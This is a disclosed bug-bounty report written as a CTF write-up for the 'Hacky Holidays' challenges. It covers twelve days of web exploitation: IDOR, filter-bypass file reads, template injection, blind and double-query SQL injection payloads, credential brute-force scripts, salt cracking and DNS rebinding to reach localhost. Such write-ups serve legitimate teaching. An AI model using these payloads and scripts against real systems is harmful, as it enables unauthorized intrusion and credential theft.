# [ Hacky Holidays CTF ] Completely taken down the Grinch Networks

## Report Details
- **Report ID**: 1066914
- **URL**: https://hackerone.com/reports/1066914
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-27T08:52:23.328Z
- **Disclosed**: 2021-01-11T21:32:20.523Z

## Reporter
- **Username**: pspspsp
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
**Day 1 - Robot flag**

We're presented with sample ui page without any function. So I guessed content discovery is the best way to find flag.

And robots.txt came to my mind and found the flag.

>>https://hackyholidays.h1ctf.com/robots.txt

Response
```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

>>Flag 1-:  flag{48104912-28b0-494a-9995-a203d1e261e7}==

**Day 2 - s3cr3t-ar3a**

You may noticed that we saw strange text in robots.txt

   Disallow: /s3cr3t-ar3a

When I tried to access this page, it look like the removed page but checked the source with Inspect Element and found the flag

```
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
<p>I've moved this page to keep people out!</p>
<p>If you're allowed access you'll know where to look for the proper page!</p>
</div>
```
>>Flag 2-: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}

**Day 3 - Grinch People Rater**

>>https://hackyholidays.h1ctf.com/people-rater

Day 3 challenge starts with a little fancy thing but nothing much yet .

There are 16 people names in page and by clicking any name makes a GET request along with their base64 decoded user id to retrieve information.

I checked the first one "Tea Avery"  and his/her id was 2.

eyJpZCI6Mn0 = {"id":2}

Basically his/her id probably should be 1 but it wasn't, so who is User {"id":1} ?

I encoded {"id":1} to base64 and make a request to see what happens and of course, it was the Grinch and retrieved flag along with his information.

{F1131249}

>>Flag 3 -:  flag{b705fb11-fb55-442f-847f-0931be82ed9a}

**Day 4 - Grinch Swag Shop**

>>https://hackyholidays.h1ctf.com/swag-shop

Simple swag shop but when we tried to purchase some item, Login page was appeared.

Neither we don't have any provided credentials nor account register page, we may find a way to get access as authenticated user.

After collecting some endpoints, I got the following list
```
/swag-shop/api/purchase
/swag-shop/checkout/
/swag-shop/api/login
```

As per my experience, I looked for /swag-shop/api/user and got the following response
```
HTTP/1.1 400 Bad Request
Server: nginx/1.18.0 (Ubuntu)
....
{"error":"Missing required fields"}
```

Interesting but not that much useful, then I run [Arjun](https://github.com/s0md3v/Arjun) through this api endpoint and found a valid parameter "**uuid**".

{F1131256}

We needed to find valid  **"uuid"**  value and I wasn't able to get it. So I fuzzed using [ffuf](https://github.com/ffuf/ffuf) and got  the following api endpoint leaking some user session.

>>https://hackyholidays.h1ctf.com/swag-shop/api/sessions

{F1131258}

 I decoded all sessions value and one of these sessions contained valid uuid parameter value.

{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}

Now all we have to do is just append the uuid value in above user api endpoint and get the flag.

{F1131250}

>>Flag 4 -: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}

**Day 5 - Secure Login**

>>https://hackyholidays.h1ctf.com/secure-login

As it said, we just need to login to get flag.
Putting random default credentials resulted "Invalid Username".It look like we need to brute force to get valid username first.
After running Burp Intruder a while with rockyou.txt , got a valid username "access".
Repeat same process for password and found "computer" as valid password.

Logged in and we see the error "No Files To Download", and the cookie parameter is interesting 

securelogin:"eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0="

Decoding the value got the following text.

{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}

Change parameter admin to "true"  and we're provided with encrypted zip file.

{F1131260}

Now simply run the fcrackzip in order to crack zip file and found the password  " hahahaha".

>>fcrackzip -u -D -p rockyou-75.txt my_secure_files_not_for_you.zip

{F1131262}

Unzip the file and got the flag!!

>>Flag 5 -: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

**Day 6 - My-diary**

>>https://hackyholidays.h1ctf.com/my-diary/?template=entries.html

As you could see, the first thing came to my mind is LFI but failed to read local file like /etc/passwd so I tried to read default thing like index.php.

And now we can see the source code
```
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```
>>$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);

The first preg_replace() function does to prevent from reading local file so we might skip this part.

    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);

As it said, the above str_replace() function protect from being read "admin.php" but we can simply bypass this by tricking like

>>?template=admadmin.phpin.php

{F1131259}

but  our flag is in "secretadmin.php" so we can simply use to bypass the same way above using the payload

>>https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretadminadmin.php.phpmin.php

And we got the flag!!

{F1131252}

>>Flag 6 -: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}

**Day 7 - Hate Mail Generator**

https://hackyholidays.h1ctf.com/hate-mail-generator

By looking sample campaign, I got know that we can use template to create campaign but generating new campaign causing error but we can use preview.

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
......
preview_markup=Hello,{{name}}&preview_data={"name":"Alice","email":"alice@test.com"}
```
And we got the response

```
Hello, Alice
```
I tried normal template injection payload and didn't work then I noticed that we could use to render the .html file using {template:cbdj3_grinch_header.html}

At this time, I run dirsearch and found this template folder https://hackyholidays.h1ctf.com/hate-mail-generator/templates/

{F1131261}

As we can see, the 38dhs_admins_only_header.html file is interesting but it give response 403.But what if we can render this file using above
template markup.I tried to render this page like this 
```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
......
preview_markup=Hello,{{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```
And we got the flag straightforward

{F1131247}

>>Flag 7 -: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}

Day 8 - Grinch Forum

https://hackyholidays.h1ctf.com/forum

It's simple , we just need to login to get the flag but how?

I tried different ways to login like brute forcing username/password, sqli, but nothing worked.
Also found the phpmyadmin login page but couldn't able to login

Then I had no idea , just search "Grinch Networks" in google and found interesting [repo](https://github.com/Grinch-Networks/forum) created by challenge author in his profile.

After looking for a while, I thought he just leaked this repo by mistake but i just noticed there are some commits in repo.

> https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae

```
 static public function read(){
        if( gettype(self::$read) == 'string' ) {
            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
            self::$read = new DbConnect( false, '', '','' );
        }
        return self::$read;
    }
@@ -146,7 +146,7 @@ public static function closeAll(){
     */
    static public function write(){
        if( gettype(self::$write) == 'string' ) {
            self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
            self::$write = new DbConnect( true,  '', '','' );
        }
        return self::$write;
    }
```
By comparing with new code, he just removed these credentials from repo.So I was able to login phpmyadmin using this info and found Admin login username and password.
```
id 	username 	password 	                                                                 admin
1 	grinch 	35D652126CA1706B59DB02C93E0C9FBF 	1
2 	max 	388E015BC43980947FCE0E5DB16481D1
```
Simply cracked the grinch password and we logged into admin panel and found the flag

{F1131248}

>>Flag 8 -: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}

**Day 9 - Evil Quiz**

Firstly, when we try to simple name and submit quiz answers
```
POST /evil-quiz/ HTTP/1.1
Host: hackyholidays.h1ctf.com
.....
Cookie: session=7d63eaccc80ec7b6553c0b19ec10e4d0
....
name=lol
```

Got the response in https://hackyholidays.h1ctf.com/evil-quiz/score endpoint saying

"***There is 1 other player(s) with the same name as you!***"

But adding ' at the end of name got the response "***There is 0 other player(s) with the same name as you!***"

and I believed "name" parameter is vulnerable to second order sql  injection. 

now we need to fix the query to confirm the sql injection
Adding   --        as comment  didn't work
Adding   --+-   as comment didn't work
Adding    #          as comment worked

So I confirmed this parameter is probably vulnerable to second order sql  injection. For further exploitation,I run sqlmap but didn't success. ( may be I missed something with sqlmap )

Then I decided to do manual injection with boolean based as I was lazy to automate by writing own script .

Getting table
```
Request

name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))<100#

Response

There is 769468 other player(s) with the same name as you!
```
It means **TRUE** that the ASCII value of table_name's first character is less than 100 and we need to specify more
```
Request

name=lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))<90#

Response

There is 0 other player(s) with the same name as you!
```

It means **FALSE** that the ASCII value of table_name's first character isn't less than 90 so we can confirm the first character is between 90-100.

By trying each number, we found the valid one.

```
name=lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),1,1))=97#

TRUE
```
97 is the value of  [ASCII](https://www.ascii-code.com/) character "a" so we know that the first character of table name is "a".

we can get the next letter by incrementing the 1, to a 2, in our substring() statement.

```
name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))>90#

TRUE

name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))<100#

FALSE

name = lol'+or+Ascii(substring((Select+concat(table_name)from+information_schema.tables+where+table_schema=database()+limit+0,1),2,1))=100#

TRUE
```
Converting 100 to ASCII character we got "d" . so  probably the table_name is "admin".
Now let's get the columns with the following query.
```
name =lol'+or+Ascii(substring((Select+concat(column_name)+from+information_schema.columns+where+table_name=0x61646d696e+limit+0,1),1,1))>0#
```
Keep doing the same way as above, so far we have the valid columns "username" and "passsword"

Getting username
```
name = lol'+or+Ascii(substring((Select+concat(username)+from+admin+limit+0,1),1,1))>0#
```
Getting password
```
name = lol'+or+Ascii(substring((Select+concat(password)+from+admin+limit+0,1),1,1))>0#
```
Now we have the username and password to login [admin panel](https://hackyholidays.h1ctf.com/evil-quiz/admin)
username = admin  
password = S3creT_p4ssw0rd-$

Upon logging with above credentials, we can see the flag finally.

{F1131251}

PS. Actually this challenge took me 5-6 hours to get the final flag because the server takes too long to response to the request.

>>Flag 9 -: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}

**Day 10  - SignUp Manager**

https://hackyholidays.h1ctf.com/signup-manager/

At first sight, we're provided with simple SignUp and Login page.

By checking source code, found the comment 

<!-- See README.md for assistance -->

Upon looking for README.md , we know file zip file path which might be included source codes.

>>https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip

***Analyzing the source code***

After reviewing multiples php files, index.php look interesting.

Let's take a look at Signup function
```
<?php
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
?>
```
As far as we saw, Signup function straightforward expect the character limit for various input. OK , now let's jump into AddUser() function
```
<?php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
?>
```
It simply takes our input and 

> fill up to 15 characters
> append these all in one line using ".=" operator
> put all conetnt in users.txt
> return random_hash to set user session.

Now take a look at, builduser() function
```
<?php
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
?>
```
The first line set the array which named $users and get user info from file content of users.txt.

Then get the each stored values using substr()  and removed "#" characters and save at $users arrray.

The last one is interesting that it compare the last character of our strings to "Y" 
> 'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)

and if  it returns true, we got admin access by  following code.
```
<?php
$all_users = buildUsers();
$page = 'signup.php';
if( isset($_COOKIE["token"]) ){
    foreach( $all_users as $u ){
        if( $u["cookie"] === $_COOKIE["token"] ){
            if( $u["admin"] ){
                $page = 'admin.php';
            }else{
                $page = 'user.php';
            }
        }
    }
}
?>
```
But normally  it's not possible to make the last character "Y" because you might notice that  $line .= 'N'; append 'N' in the last of our info in user.txt.
So we need to find a way to push our input into last character to be "Y".

After looking hours for multiple function, 

> $age = intval($_POST["age"]);
 
This intval() function took my attention. We are allowed to set age number up to 3 characters and these number needed to be numeric.
```
<?php
if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
?>
```
I read the documentation abot intval() function and came to know that we can use this  scientific notation 'e' to get longer number  with 3 characters.
```
<?php
echo intval(1e3);                        //1000
echo intval(1e4);                       //10000
echo intval(1e5);                       // 100000 
echo intval(1e10);                    //  10000000000 
?>
```
Now, it's time to construct our final payload to get flag.when we set age number to "1e5" the server calculate the value and response with 100000.
So the final input payload become like this.

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:84.0) Gecko/20100101 Firefox/84.0
.....
.....

action=signup&username=LMAO&password=12345&age=1e5&firstname=XXXXXXXXXXXXXXX&lastname=YYYYYYYYYYYYYYY
```
Our last name field become the last character "Y" because the following code stripped the string if it was more than 113 characters.

>$line = substr($line,0,113);

And now when this function check the last character of our string it will return TRUE .

>'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)

Finally, we got admin access and found the flag.

{F1131253}

>>Flag 10 -: flag{99309f0f-1752-44a5-af1e-a03e4150757d}

**Day 11 - Grinch Recon Server**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/

Initial running dirsearch found the api endpoint https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/
But when we try to make any request to https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/* , got the response saying

"This endpoint cannot be visited from this IP address"

I thought it might be accessible by adding some custom headers but nothing worked.

And then looked into photo album,it didn't take long to identify that the  hash parameter is vulnerable to sql injection.
```
Identifying Sql injection

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol'            Response  404

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k--+-     Response 200

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k' order by  4--+-  Reponse 404

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k ' order+by 3--+-   Response 200

Getting vulnerable column

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select 1,2,3--+-     Response 200 and 3rd column is printed
(Please note that we need to remove original hash value to see vulnerbale column)

Trying to extract table name using the query

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select 1,2,table_name+from information_schema.tables where table_schema=database()--+-
```

But it didn't work. After trying to bypass with various ways, something came up with Double Query injcetion.
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1'","2","3"--+-

Putting ' in the first column and something strange happend and fix the query by comment(--+-) and got the normal response back.

>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1'--+-","2","3"--+-
```

Now we can confirm double query injection is possible here. Let's move further.
```
>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' order by 4--+-","2","3"--+-    ERROR

>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' order by 3--+-","2","3"--+-     Normal Reponse

>>https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",\"3\"--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/3","auth":"fea7507478aa8225c022527b1763fb33"}
```
Upon executing above query, we got the response which vulnerable column is reflecting image request data.
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",database()--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/recon","auth":"015cc4ed326cfc9e314afdaf594a5ce3"}

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' union+select "1' union select \"1\",\"2\",version()--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/8.0.22-0ubuntu0.20.04.3","auth":"03d2bc97a58dc15c4eaf5d4fa2d9f93d"}
```
Combining with path traversal, we can generate valid auth hash for any endpoint which we want to make reuqest.
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/\"--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/","auth":"05a7e708a5f3da76506023047628829d"}
```
Now we can perfrom request to api endpoint /api/* with valid auth hash.
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9
```
One thing is that we need to find valid endpoint to make requests.After guessing multiple endpoints, the following endpoint seems to be valid bocz it response with "Invalid content type detected" .Normally if we make request to invalid endpoint the server responses us with 404.

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/lol\"--+-","2","3"--+-

{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/lol","auth":"494c095363e0f1a99e1c869887522c62"}

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2xvbCIsImF1dGgiOiI0OTRjMDk1MzYzZTBmMWE5OWUxYzg2OTg4NzUyMmM2MiJ9

Expected HTTP status 200, Received: 404

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user\"--+-","2","3"--+-

Invalid content type detected
```

By using the same method, we can guess the  parameters either and found username and password.
```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?test=lol\"--+-","2","3"--+-

Expected HTTP status 200, Received: 400 Bad Request

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=lol\"--+-","2","3"--+-

Expected HTTP status 200, Received: 204

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?password=lol\"--+-","2","3"--+-

Expected HTTP status 200, Received: 204
```
So far, we have valid api endpoint and parameters either, now final step is to get valid username and password.

In this case, we can use sql wildcard character (% , _ ) to enumerate username and password.Let's see how it works.

Firstly , let's confrim how many length has username and password.

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=__________%\"--+-","2","3"--+-  ( 10 underscores )

Expected HTTP status 200, Received: 204

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=___________%\"--+-","2","3"--+-  ( 11 underscores )

Invalid content type detected

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=____________%\"--+-","2","3"--+-  ( 12 underscores )

Expected HTTP status 200, Received: 204

OK so username has 10 characters, let's see about passoword

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=__________%\"--+-","2","3"--+-  ( 10 underscores )

Invalid content type detected

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=lol ' UNION SELECT "1' union select \"1\",\"2\",\"../api/user?username=___________%\"--+-","2","3"--+-  ( 11 underscores )

Expected HTTP status 200, Received: 204
```
Now we're able to identify that username has 11 characters and password has 10 characters.
In order to extract username and password, I made a lazy script to automate these steps.

```
#!/usr/bin/python3
import requests
from urllib.request import urlopen
from bs4 import BeautifulSoup
import string
import numpy as np

alphabet = list(string.ascii_lowercase)
number = list(range(0,10))
fuzz = np.concatenate((alphabet,number))
username = ""
while len(username) < 11:
	for i in fuzz:
		i = username + i
		payload = "lol%20%27%20UNION%20SELECT%20%221%27%20union%20select%20\%221\%22,\%222\%22,\%22../api/user?username={}%\%22--+-%22,%222%22,%223%22--+-".format(i)
		url = "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash={}".format(payload)
		req = urlopen(url)
		bs = BeautifulSoup(req.read(), 'html.parser')
		response = bs.find_all('img',class_='img-responsive')
		img_data = response[2]
		sec_req =requests.get("https://hackyholidays.h1ctf.com"+img_data['src'])
		response_txt = sec_req.text
		if "Invalid content type detected" not in response_txt:
			continue
		else:
			username = username + i[-1]
			print("Found valid character: "+i)
			break
else:
	print("Here's the final username: "+username)
```
Run the script and get the valid username : grinchadmin

{F1131246}

For the password, we can either use above script by making a little changes

{F1131246}

Now, simply login into attack-box and find the flag.

>https://hackyholidays.h1ctf.com/attack-box/login

{F1131254}

>>Flag 11 -: flag{07a03135-9778-4dee-a83c-7ec330728e72}

**Day 12 - Grinch Network Attack Server**

As it's saying ,

"We've identified Santa's key servers and loaded them into the attack server ready for you to take down"

We're supposed to "take down the Grinch networks" in order to get the flag and we need to find a way.

Once we try to attack the server, the browser sent the request with uniqe hash for each ip.
```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```
If we try to change the target ip to something else like 127.0.0.1,
```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQo=

Got the response

"Invalid Protection Hash"
```
So we need to find  out how server identifies the valid hash along with target ip.

I stucked there for hours and falied multiple attempts but finally I fingured it out that there's a salt which is being used to generate valid hash for target ip address.Here's the  code how we can find valid salt.
```
#!/usr/bin/python3
import hashlib 
fuzz = [line.rstrip('\n') for line in open('rockyou.txt')]
for i in fuzz:
	#{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
	  target =  i + "203.0.113.33"
	  target_hash = "5f2940d65ca4140cc18d0878bc398955"
	  generate_hash = hashlib.md5(target.encode())
	  md5 = str(generate_hash.hexdigest())
	  if target_hash == md5:
	  	print("Here's valid salt: "+i)
	  	break
```
It will take a while and once we get the salt -: mrgrinch463, we can generate valid hash for every ip address.

Tried to attack local host 127.0.0.1 but it didnt't success due to restriction.

{F1131257}

But it's possible to trick the server by using DNS Rebinding technique, after searching a while , found this [rdnr repo](https://github.com/taviso/rbndr) which we can use to bypass.By checking with host cmmand,

7f000001.c0a80001.rbndr.us  resolves  to 127.0.0.1 and 192.168.0.1 randomly.

Let's see does it work.
```
{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}    >  eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiI2MTQyMmI4MDJhMWQ2ZGRlZDJjZDdhNGNmYTgyYTExMiJ9

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
```
By making above request, once we hit to grinch's local box, we could take down his network completely and got the flag!!!!!

{F1131255}

>Flag 12 -: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}


Thanks for providing awesome ctf, learned a lots.

## Impact

..

## Attachments
- attackbox-password.png
- attackbox-username.png
- Flag_-_7.png
- Flag_-_8.png
- Flag-3.png
- Flag-4.png
- Flag-9.png
- Flag-6.png
- Flag-10.png
- Flag-11.png
- Flag-12.png
- Invalid-uuid.png
- local-attack-failed.png
- leaking-user-sessions.png
- str_replace_bypass.png
- Logged-in.png
- templats-dir.png
- zip-crack.png
